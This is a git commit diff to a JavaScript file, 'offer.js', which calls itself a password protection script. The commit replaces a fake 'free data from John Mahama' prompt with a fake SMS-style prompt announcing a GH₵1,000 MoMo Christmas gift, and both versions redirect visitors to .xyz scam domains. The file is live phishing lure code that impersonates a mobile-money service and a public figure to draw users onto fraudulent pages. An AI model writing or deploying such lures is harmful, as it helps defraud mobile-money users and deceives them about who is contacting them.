7db13bce58c2b9be07d0909d5f5ecf8cb38d2777
KENNY <examtapz+me@gmail.com>
2025-12-08 17:12:41 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,7 +1,8 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '0k'
-password=prompt('SMS: Welcome to Ghana GH₵10 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
-if (password != 'ok') {
-location.href='https://mahama.data-offer.xyz/15GB';
+var password = 'GH₵1,000'
+password=prompt('SMS: Congratulations, your MoMo account is eligible to receive the MoMo Christmas gift of GH₵1,000. Please click OK to Continue ','GH₵1,000');
+if (password != 'GH₵1,000') {
+location.href='https://momo.allprograms.xyz/christmas';
 
 }
+
